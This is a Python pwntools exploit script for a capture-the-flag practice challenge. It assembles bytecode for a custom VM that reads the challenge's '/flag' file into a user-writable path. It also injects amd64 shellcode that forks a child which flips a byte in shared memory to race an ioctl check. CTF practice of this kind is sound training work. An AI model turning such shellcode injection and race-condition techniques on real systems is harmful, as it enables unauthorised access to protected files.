
def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="ifabdsc"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x01"
    elif arg == "read_memory":
        return b"\x08"
    elif arg == "write":
        return b"\x02"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x10"
    elif(ass[0] == "ADD"):
        op = b"\x04"
    elif(ass[0] == "STK"):
        op = b"\x40"
    elif(ass[0] == "STM"):
        op = b"\x80"
    elif(ass[0] == "LDM"):
        op = b"\x08"
    elif(ass[0] == "CMP"):
        op = b"\x02"
    elif(ass[0] == "JMP"):
        op = b"\x01"
    elif(ass[0] == "SYS"):
        op = b"\x20"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bc + bytearray(c)

    bc.insert(0, op[0])
    return bc

c = bytearray()
yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d

IMM a = 0x80
IMM b = 0x40
IMM c = 0xff
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS read_memory a

IMM b = 0x39
CMP a b



IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS write a
'''

yangasm = yangasm.split("\n")
for i in yangasm:
    c += assembly(i)

linuxasm = '''
cmp rax, 0
jne parent
pop rdi
child:
mov al, 0x10
mov bl, 0x20
mov byte ptr[rdi + 0x48], al
mov byte ptr[rdi + 0x48], bl
jmp child
parent:

'''
from pwn import *
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
context.os = "linux"

# print(p.readuntil(b'yancode: '))
byte_codes = asm(shellcraft.mmap(0, 0x1000, 0x03, 0x01, 3, 0) +
                 "push rax\n" +
                 shellcraft.memcpy("rax", 0x31337058, len(c)) +
                 shellcraft.fork() +
                 linuxasm +
                 shellcraft.ioctl(3, 1337) +
                 "jmp parent\n")


p = process("/challenge/toddlersys_level2.0")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
p.send(byte_codes + c)

#写个脚本循环读取./b的内容
